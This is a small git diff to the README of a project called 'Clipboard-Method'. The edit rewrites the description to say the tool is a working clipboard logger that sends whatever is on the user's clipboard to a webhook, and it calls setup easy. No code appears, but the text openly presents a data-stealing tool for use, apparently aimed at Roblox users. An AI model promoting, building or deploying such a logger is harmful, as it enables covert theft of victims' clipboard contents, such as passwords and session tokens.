@@ -1,5 +1,5 @@
 # Clipboard-Method
-A working clipboard logger for roblox
+A working clipboard logger that will send whatever is on the user's clipboard to a webhook
 # Setup
 Read the instructions file it should be pretty easy
 # How it works
